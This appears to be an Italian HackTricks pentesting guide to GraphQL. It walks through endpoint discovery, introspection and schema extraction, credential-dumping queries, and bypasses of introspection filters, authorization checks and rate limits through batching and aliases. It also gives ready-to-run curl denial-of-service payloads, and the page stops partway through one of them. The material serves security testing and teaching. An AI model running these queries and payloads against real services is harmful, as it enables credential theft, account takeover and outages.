# GraphQL

{{#include ../../banners/hacktricks-training.md}}

## Introduzione

GraphQL è **evidenziato** come un **alternativa efficiente** alle API REST, offrendo un approccio semplificato per interrogare i dati dal backend. A differenza di REST, che spesso richiede numerose richieste attraverso vari endpoint per raccogliere dati, GraphQL consente di recuperare tutte le informazioni necessarie tramite una **singola richiesta**. Questa semplificazione **beneficia significativamente gli sviluppatori** riducendo la complessità dei loro processi di recupero dati.

## GraphQL e Sicurezza

Con l'avvento di nuove tecnologie, inclusa GraphQL, emergono anche nuove vulnerabilità di sicurezza. Un punto chiave da notare è che **GraphQL non include meccanismi di autenticazione per impostazione predefinita**. È responsabilità degli sviluppatori implementare tali misure di sicurezza. Senza una corretta autenticazione, gli endpoint GraphQL possono esporre informazioni sensibili a utenti non autenticati, ponendo un rischio significativo per la sicurezza.

### Attacchi di Brute Force alle Directory e GraphQL

Per identificare istanze GraphQL esposte, si raccomanda di includere percorsi specifici negli attacchi di brute force alle directory. Questi percorsi sono:

- `/graphql`
- `/graphiql`
- `/graphql.php`
- `/graphql/console`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

Identificare istanze GraphQL aperte consente di esaminare le query supportate. Questo è cruciale per comprendere i dati accessibili tramite l'endpoint. Il sistema di introspezione di GraphQL facilita questo fornendo dettagli sulle query supportate da uno schema. Per ulteriori informazioni su questo, fare riferimento alla documentazione di GraphQL sull'introspezione: [**GraphQL: A query language for APIs.**](https://graphql.org/learn/introspection/)

### Fingerprint

Lo strumento [**graphw00f**](https://github.com/dolevf/graphw00f) è in grado di rilevare quale motore GraphQL è utilizzato in un server e poi stampa alcune informazioni utili per l'auditor di sicurezza.

#### Query universali <a href="#universal-queries" id="universal-queries"></a>

Per controllare se un URL è un servizio GraphQL, può essere inviata una **query universale**, `query{__typename}`. Se la risposta include `{"data": {"__typename": "Query"}}`, conferma che l'URL ospita un endpoint GraphQL. Questo metodo si basa sul campo `__typename` di GraphQL, che rivela il tipo dell'oggetto interrogato.
```javascript
query{__typename}
```
### Enumerazione di Base

Graphql di solito supporta **GET**, **POST** (x-www-form-urlencoded) e **POST**(json). Anche se per motivi di sicurezza è consigliato consentire solo json per prevenire attacchi CSRF.

#### Introspezione

Per utilizzare l'introspezione per scoprire informazioni sullo schema, interroga il campo `__schema`. Questo campo è disponibile sul tipo radice di tutte le query.
```bash
query={__schema{types{name,fields{name}}}}
```
Con questa query troverai il nome di tutti i tipi utilizzati:

![](<../../images/image (1036).png>)
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
Con questa query puoi estrarre tutti i tipi, i loro campi e i loro argomenti (e il tipo degli argomenti). Questo sarà molto utile per sapere come interrogare il database.

![](<../../images/image (950).png>)

**Errori**

È interessante sapere se gli **errori** verranno **mostrati** poiché contribuiranno con informazioni utili.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../images/image (416).png>)

**Enumerare lo Schema del Database tramite Introspezione**

> [!NOTE]
> Se l'introspezione è abilitata ma la query sopra non viene eseguita, prova a rimuovere le direttive `onOperation`, `onFragment` e `onField` dalla struttura della query.
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Query di introspezione inline:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
L'ultima riga di codice è una query graphql che estrarrà tutte le meta-informazioni dal graphql (nomi degli oggetti, parametri, tipi...)

![](<../../images/image (363).png>)

Se l'introspezione è abilitata, puoi usare [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) per visualizzare in un'interfaccia grafica tutte le opzioni.

### Querying

Ora che sappiamo che tipo di informazioni sono salvate nel database, proviamo a **estrarre alcuni valori**.

Nell'introspezione puoi trovare **quale oggetto puoi interrogare direttamente** (perché non puoi interrogare un oggetto solo perché esiste). Nell'immagine seguente puoi vedere che il "_queryType_" si chiama "_Query_" e che uno dei campi dell'oggetto "_Query_" è "_flags_", che è anche un tipo di oggetto. Pertanto, puoi interrogare l'oggetto flag.

![](<../../images/Screenshot from 2021-03-13 18-17-48.png>)

Nota che il tipo della query "_flags_" è "_Flags_", e questo oggetto è definito come segue:

![](<../../images/Screenshot from 2021-03-13 18-22-57 (1).png>)

Puoi vedere che gli oggetti "_Flags_" sono composti da **name** e **value**. Quindi puoi ottenere tutti i nomi e i valori dei flag con la query:
```javascript
query={flags{name, value}}
```
Nota che nel caso in cui l'**oggetto da interrogare** sia un **tipo** **primitivo** come **string** come nel seguente esempio

![](<../../images/image (958).png>)

Puoi semplicemente interrogarlo con:
```javascript
query = { hiddenFlags }
```
In un altro esempio dove c'erano 2 oggetti all'interno dell'oggetto di tipo "_Query_": "_user_" e "_users_".\
Se questi oggetti non necessitano di alcun argomento per la ricerca, potresti **recuperare tutte le informazioni da essi** semplicemente **chiedendo** i dati che desideri. In questo esempio da Internet potresti estrarre i nomi utente e le password salvate:

![](<../../images/image (880).png>)

Tuttavia, in questo esempio se provi a farlo ottieni questo **errore**:

![](<../../images/image (1042).png>)

Sembra che in qualche modo cercherà utilizzando l'argomento "_**uid**_" di tipo _**Int**_.\
Comunque, già sapevamo che, nella sezione [Basic Enumeration](graphql.md#basic-enumeration), era stata proposta una query che ci mostrava tutte le informazioni necessarie: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Se leggi l'immagine fornita quando eseguo quella query vedrai che "_**user**_" aveva l'**arg** "_**uid**_" di tipo _Int_.

Quindi, eseguendo un leggero _**uid**_ bruteforce ho scoperto che in _**uid**=**1**_ è stato recuperato un nome utente e una password:\
`query={user(uid:1){user,password}}`

![](<../../images/image (90).png>)

Nota che ho **scoperto** che potevo chiedere i **parametri** "_**user**_" e "_**password**_" perché se provo a cercare qualcosa che non esiste (`query={user(uid:1){noExists}}`) ottengo questo errore:

![](<../../images/image (707).png>)

E durante la **fase di enumerazione** ho scoperto che l'oggetto "_**dbuser**_" aveva come campi "_**user**_" e "_**password**_.

**Trucco di dump della stringa di query (grazie a @BinaryShadow\_)**

Se puoi cercare per un tipo di stringa, come: `query={theusers(description: ""){username,password}}` e **cerchi una stringa vuota** esso **dumpa tutti i dati**. (_Nota che questo esempio non è correlato all'esempio dei tutorial, per questo esempio supponi di poter cercare usando "**theusers**" tramite un campo String chiamato "**description**"_).

### Ricerca

In questa configurazione, un **database** contiene **persone** e **film**. Le **persone** sono identificate dalla loro **email** e **nome**; i **film** dal loro **nome** e **valutazione**. Le **persone** possono essere amiche tra loro e avere anche film, indicando relazioni all'interno del database.

Puoi **cercare** persone **per** il **nome** e ottenere le loro email:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Puoi **cercare** persone **per** il **nome** e ottenere i loro **film** **sottoscritti**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Nota come è indicato per recuperare il `name` dei `subscribedMovies` della persona.

Puoi anche **cercare diversi oggetti contemporaneamente**. In questo caso, viene effettuata una ricerca di 2 film:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
O anche **relazioni di diversi oggetti utilizzando alias**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutazioni

**Le mutazioni sono utilizzate per apportare modifiche lato server.**

Nell'**introspezione** puoi trovare le **mutazioni** **dichiarate**. Nell'immagine seguente, il "_MutationType_" è chiamato "_Mutation_" e l'oggetto "_Mutation_" contiene i nomi delle mutazioni (come "_addPerson_" in questo caso):

![](<../../images/Screenshot from 2021-03-13 18-26-27 (1).png>)

In questa configurazione, un **database** contiene **persone** e **film**. Le **persone** sono identificate dalla loro **email** e **nome**; i **film** dal loro **nome** e **valutazione**. Le **persone** possono essere amiche tra loro e avere anche film, indicando relazioni all'interno del database.

Una mutazione per **creare nuovi** film all'interno del database può essere simile alla seguente (in questo esempio la mutazione è chiamata `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Nota come sia i valori che il tipo di dati sono indicati nella query.**

Inoltre, il database supporta un'operazione di **mutazione**, chiamata `addPerson`, che consente la creazione di **persone** insieme alle loro associazioni con **amici** e **film** esistenti. È fondamentale notare che gli amici e i film devono esistere nel database prima di collegarli alla persona appena creata.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Direttiva Overloading

Come spiegato in [**una delle vulnerabilità descritte in questo rapporto**](https://www.landh.tech/blog/20240304-google-hack-50000/), un direttiva overloading implica la chiamata di una direttiva anche milioni di volte per far sprecare operazioni al server fino a quando non è possibile effettuare un DoS.

### Batching brute-force in 1 richiesta API

Queste informazioni sono state tratte da [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Autenticazione tramite API GraphQL con **invio simultaneo di molte query con credenziali diverse** per verificarlo. È un attacco brute force classico, ma ora è possibile inviare più di una coppia login/password per richiesta HTTP grazie alla funzionalità di batching di GraphQL. Questo approccio ingannerebbe le applicazioni esterne di monitoraggio del tasso, facendole pensare che tutto va bene e che non ci sia un bot di brute-forcing che cerca di indovinare le password.

Di seguito puoi trovare la dimostrazione più semplice di una richiesta di autenticazione dell'applicazione, con **3 coppie di email/password diverse alla volta**. Ovviamente è possibile inviare migliaia in una singola richiesta nello stesso modo:

![](<../../images/image (1081).png>)

Come possiamo vedere dallo screenshot della risposta, la prima e la terza richiesta hanno restituito _null_ e hanno riflesso le informazioni corrispondenti nella sezione _error_. La **seconda mutazione aveva i dati di autenticazione corretti** e la risposta ha il token di sessione di autenticazione corretto.

![](<../../images/image (119) (1).png>)

## GraphQL Senza Introspezione

Sempre più **endpoint graphql stanno disabilitando l'introspezione**. Tuttavia, gli errori che graphql genera quando viene ricevuta una richiesta inaspettata sono sufficienti per strumenti come [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) per ricreare la maggior parte dello schema.

Inoltre, l'estensione di Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **osserva le richieste API GraphQL che passano attraverso Burp** e **costruisce** uno **schema** GraphQL interno con ogni nuova query che vede. Può anche esporre lo schema per GraphiQL e Voyager. L'estensione restituisce una risposta falsa quando riceve una query di introspezione. Di conseguenza, GraphQuail mostra tutte le query, gli argomenti e i campi disponibili per l'uso all'interno dell'API. Per ulteriori informazioni [**controlla questo**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Una bella **wordlist** per scoprire [**entità GraphQL può essere trovata qui**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Bypassare le difese di introspezione GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

Per bypassare le restrizioni sulle query di introspezione nelle API, inserire un **carattere speciale dopo la parola chiave `__schema`** si è dimostrato efficace. Questo metodo sfrutta le comuni disattenzioni degli sviluppatori nei modelli regex che mirano a bloccare l'introspezione concentrandosi sulla parola chiave `__schema`. Aggiungendo caratteri come **spazi, nuove righe e virgole**, che GraphQL ignora ma che potrebbero non essere considerati nel regex, le restrizioni possono essere eluse. Ad esempio, una query di introspezione con una nuova riga dopo `__schema` può bypassare tali difese:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Se non hai successo, considera metodi di richiesta alternativi, come **GET requests** o **POST con `x-www-form-urlencoded`**, poiché le restrizioni potrebbero applicarsi solo alle richieste POST.

### Prova WebSockets

Come menzionato in [**questo intervento**](https://www.youtube.com/watch?v=tIo_t5uUK50), verifica se potrebbe essere possibile connettersi a graphQL tramite WebSockets, poiché ciò potrebbe consentirti di bypassare un potenziale WAF e far sì che la comunicazione websocket riveli lo schema del graphQL:
```javascript
ws = new WebSocket("wss://target/graphql", "graphql-ws")
ws.onopen = function start(event) {
var GQL_CALL = {
extensions: {},
query: `
{
__schema {
_types {
name
}
}
}`,
}

var graphqlMsg = {
type: "GQL.START",
id: "1",
payload: GQL_CALL,
}
ws.send(JSON.stringify(graphqlMsg))
}
```
### **Scoprire Strutture GraphQL Esposte**

Quando l'introspezione è disabilitata, esaminare il codice sorgente del sito web per query precaricate nelle librerie JavaScript è una strategia utile. Queste query possono essere trovate utilizzando la scheda `Sources` negli strumenti per sviluppatori, fornendo informazioni sullo schema dell'API e rivelando potenzialmente **query sensibili esposte**. I comandi per cercare all'interno degli strumenti per sviluppatori sono:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF in GraphQL

Se non sai cos'è il CSRF, leggi la seguente pagina:

{{#ref}}
../../pentesting-web/csrf-cross-site-request-forgery.md
{{#endref}}

Là fuori puoi trovare diversi endpoint GraphQL **configurati senza token CSRF.**

Nota che le richieste GraphQL vengono solitamente inviate tramite richieste POST utilizzando il Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Tuttavia, la maggior parte degli endpoint GraphQL supporta anche le richieste POST **`form-urlencoded`:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Pertanto, poiché le richieste CSRF come quelle precedenti vengono inviate **senza richieste di preflight**, è possibile **eseguire** **modifiche** nel GraphQL abusando di un CSRF.

Tuttavia, nota che il nuovo valore predefinito del cookie del flag `samesite` di Chrome è `Lax`. Ciò significa che il cookie verrà inviato solo da un sito web di terze parti in richieste GET.

Nota che è solitamente possibile inviare la **richiesta** **query** anche come **richiesta** **GET** e il token CSRF potrebbe non essere convalidato in una richiesta GET.

Inoltre, abusando di un [**XS-Search**](../../pentesting-web/xs-search/index.html) **attacco** potrebbe essere possibile esfiltrare contenuti dall'endpoint GraphQL abusando delle credenziali dell'utente.

Per ulteriori informazioni **controlla il** [**post originale qui**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Hijacking WebSocket cross-site in GraphQL

Simile alle vulnerabilità CRSF che abusano di GraphQL, è anche possibile eseguire un **hijacking WebSocket cross-site per abusare di un'autenticazione con GraphQL con cookie non protetti** e far eseguire all'utente azioni inaspettate in GraphQL.

Per ulteriori informazioni controlla:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}

## Autorizzazione in GraphQL

Molte funzioni GraphQL definite sull'endpoint potrebbero controllare solo l'autenticazione del richiedente ma non l'autorizzazione.

Modificare le variabili di input della query potrebbe portare a dettagli sensibili dell'account [leaked](https://hackerone.com/reports/792927).

Le mutazioni potrebbero persino portare a un takeover dell'account tentando di modificare i dati di altri account.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Bypass authorization in GraphQL

[Chaining queries](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) insieme può bypassare un sistema di autenticazione debole.

Nell'esempio sottostante puoi vedere che l'operazione è "forgotPassword" e che dovrebbe eseguire solo la query forgotPassword associata. Questo può essere bypassato aggiungendo una query alla fine, in questo caso aggiungiamo "register" e una variabile utente affinché il sistema registri un nuovo utente.

<figure><img src="../../images/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Bypassing Rate Limits Using Aliases in GraphQL

In GraphQL, gli alias sono una funzionalità potente che consente di **nominare esplicitamente le proprietà** quando si effettua una richiesta API. Questa capacità è particolarmente utile per recuperare **più istanze dello stesso tipo** di oggetto all'interno di una singola richiesta. Gli alias possono essere utilizzati per superare la limitazione che impedisce agli oggetti GraphQL di avere più proprietà con lo stesso nome.

Per una comprensione dettagliata degli alias GraphQL, si consiglia la seguente risorsa: [Aliases](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Sebbene lo scopo principale degli alias sia ridurre la necessità di numerose chiamate API, è stato identificato un caso d'uso non intenzionale in cui gli alias possono essere sfruttati per eseguire attacchi di forza bruta su un endpoint GraphQL. Questo è possibile perché alcuni endpoint sono protetti da limitatori di velocità progettati per ostacolare gli attacchi di forza bruta limitando il **numero di richieste HTTP**. Tuttavia, questi limitatori di velocità potrebbero non tenere conto del numero di operazioni all'interno di ciascuna richiesta. Dato che gli alias consentono l'inclusione di più query in una singola richiesta HTTP, possono eludere tali misure di limitazione della velocità.

Considera l'esempio fornito di seguito, che illustra come le query con alias possono essere utilizzate per verificare la validità dei codici sconto del negozio. Questo metodo potrebbe aggirare la limitazione della velocità poiché compila diverse query in una sola richiesta HTTP, consentendo potenzialmente la verifica di numerosi codici sconto simultaneamente.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## DoS in GraphQL

### Alias Overloading

**Alias Overloading** è una vulnerabilità di GraphQL in cui gli attaccanti sovraccaricano una query con molti alias per lo stesso campo, causando l'esecuzione ripetuta di quel campo da parte del risolutore backend. Questo può sovraccaricare le risorse del server, portando a un **Denial of Service (DoS)**. Ad esempio, nella query sottostante, lo stesso campo (`expensiveField`) viene richiesto 1.000 volte utilizzando alias, costringendo il backend a calcolarlo 1.000 volte, potenzialmente esaurendo CPU o memoria:
```graphql
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "Content-Type: application/json" \
-d '{"query": "{ alias0:__typename \nalias1:__typename \nalias2:__typename \nalias3:__typename \nalias4:__typename \nalias5:__typename \nalias6:__typename \nalias7:__typename \nalias8:__typename \nalias9:__typename \nalias10:__typename \nalias11:__typename \nalias12:__typename \nalias13:__typename \nalias14:__typename \nalias15:__typename \nalias16:__typename \nalias17:__typename \nalias18:__typename \nalias19:__typename \nalias20:__typename \nalias21:__typename \nalias22:__typename \nalias23:__typename \nalias24:__typename \nalias25:__typename \nalias26:__typename \nalias27:__typename \nalias28:__typename \nalias29:__typename \nalias30:__typename \nalias31:__typename \nalias32:__typename \nalias33:__typename \nalias34:__typename \nalias35:__typename \nalias36:__typename \nalias37:__typename \nalias38:__typename \nalias39:__typename \nalias40:__typename \nalias41:__typename \nalias42:__typename \nalias43:__typename \nalias44:__typename \nalias45:__typename \nalias46:__typename \nalias47:__typename \nalias48:__typename \nalias49:__typename \nalias50:__typename \nalias51:__typename \nalias52:__typename \nalias53:__typename \nalias54:__typename \nalias55:__typename \nalias56:__typename \nalias57:__typename \nalias58:__typename \nalias59:__typename \nalias60:__typename \nalias61:__typename \nalias62:__typename \nalias63:__typename \nalias64:__typename \nalias65:__typename \nalias66:__typename \nalias67:__typename \nalias68:__typename \nalias69:__typename \nalias70:__typename \nalias71:__typename \nalias72:__typename \nalias73:__typename \nalias74:__typename \nalias75:__typename \nalias76:__typename \nalias77:__typename \nalias78:__typename \nalias79:__typename \nalias80:__typename \nalias81:__typename \nalias82:__typename \nalias83:__typename \nalias84:__typename \nalias85:__typename \nalias86:__typename \nalias87:__typename \nalias88:__typename \nalias89:__typename \nalias90:__typename \nalias91:__typename \nalias92:__typename \nalias93:__typename \nalias94:__typename \nalias95:__typename \nalias96:__typename \nalias97:__typename \nalias98:__typename \nalias99:__typename \nalias100:__typename \n }"}' \
'https://example.com/graphql'
```
Per mitigare questo, implementa limiti sul conteggio degli alias, analisi della complessità delle query o limitazione della frequenza per prevenire l'abuso delle risorse.

### **Batching delle Query Basato su Array**

**Batching delle Query Basato su Array** è una vulnerabilità in cui un'API GraphQL consente di raggruppare più query in una singola richiesta, consentendo a un attaccante di inviare un numero elevato di query simultaneamente. Questo può sovraccaricare il backend eseguendo tutte le query raggruppate in parallelo, consumando risorse eccessive (CPU, memoria, connessioni al database) e potenzialmente portando a un **Denial of Service (DoS)**. Se non esiste un limite sul numero di query in un batch, un attaccante può sfruttare questo per degradare la disponibilità del servizio.
```graphql
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '[{"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}]' \
'https://example.com/graphql'
```
In questo esempio, 10 query diverse vengono accorpate in una sola richiesta, costringendo il server a eseguire tutte simultaneamente. Se sfruttato con una dimensione del batch più grande o query computazionalmente costose, può sovraccaricare il server.

### **Vulnerabilità da Sovraccarico di Direttive**

**Sovraccarico di Direttive** si verifica quando un server GraphQL consente query con direttive eccessive e duplicate. Questo può sopraffare il parser e l'esecutore del server, specialmente se il server elabora ripetutamente la stessa logica di direttiva. Senza una corretta validazione o limiti, un attaccante può sfruttare questo creando una query con numerose direttive duplicate per attivare un elevato utilizzo computazionale o di memoria, portando a **Denial of Service (DoS)**.
```bash
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @aa@aa@aa@aa@aa@aa@aa@aa@aa@aa }", "operationName": "cop"}' \
'https://example.com/graphql'
```
Nota che nell'esempio precedente `@aa` è una direttiva personalizzata che **potrebbe non essere dichiarata**. Una direttiva comune che di solito esiste è **`@include`**:
```bash
curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @include(if: true) @include(if: true) @include(if: true) @include(if: true) @include(if: true) }", "operationName": "cop"}' \
'https://example.com/graphql'
```
Puoi anche inviare una query di introspezione per scoprire tutte le direttive dichiarate:
```bash
curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "{ __schema { directives { name locations args { name type { name kind ofType { name } } } } } }"}' \
'https://example.com/graphql'
```
E poi **usa alcuni di quelli personalizzati**.

### **Vulnerabilità di Duplicità dei Campi**

La **Duplicità dei Campi** è una vulnerabilità in cui un server GraphQL consente query con lo stesso campo ripetuto eccessivamente. Questo costringe il server a risolvere il campo in modo ridondante per ogni istanza, consumando risorse significative (CPU, memoria e chiamate al database). Un attaccante può creare query con centinaia o migliaia di campi ripetuti, causando un carico elevato e potenzialmente portando a un **Denial of Service (DoS)**.
```bash
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" -H "Content-Type: application/json" \
-d '{"query": "query cop { __typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename 